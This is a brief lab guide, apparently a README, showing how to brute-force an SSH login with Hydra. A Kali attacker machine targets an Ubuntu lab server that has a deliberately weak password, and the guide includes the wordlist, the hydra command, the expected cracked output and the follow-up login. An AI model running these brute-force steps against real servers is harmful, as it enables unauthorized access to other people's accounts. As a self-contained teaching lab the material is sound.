# Password Cracker Lab using Hydra

This lab demostrates a simple brute-force password cracking attempt using Hydra to attack an SSH server with weak credentials.

## Lab Setup

Attacker Machine: Kali Linux
Victim Machine: Ubuntu Server

## Step 1: Setup Ubuntu Server (Victim)

Commands on Ubuntu Server

sudo apt update
sudo apt install openssh-server -y
sudo adduser testuser
#set password to: password123
ip a

## Step 2: Setup Kali Linux (Attacker)

Commands on Kali Linux

sudo apt update 
sudo apt install hydra -y

# Create a password list
echo -e "123456\npassword\nadmin\npassword123\nletmein" > passwords.txt

## Step 3: Brute Force Attack with Hydra

Command on Kali Linux

hydra -l testuser -P passwords.txt ssh://172.20.10.9

Expected Output:

[22] [ssh] host: 172.20.10.9	login: testuser	passwword: password123

## Step 4: Verify Access

Command on Kali Linux

ssh testuser@172.20.10.9
# Enter cracked password

whoami
hostname

